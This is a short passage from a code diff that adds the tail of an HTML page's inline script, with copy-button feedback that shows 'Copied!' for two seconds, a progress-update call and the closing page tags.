+            const originalHTML = btn.innerHTML;
+            btn.innerHTML = `<span>Copied!</span>`;
+            setTimeout(() => {
+              btn.classList.remove('copied');
+              btn.innerHTML = originalHTML;
+            }, 2000);
+          }
+        });
+      });
+
+      updateProgress();
+    })();
+  </script>
+</body>
+</html>
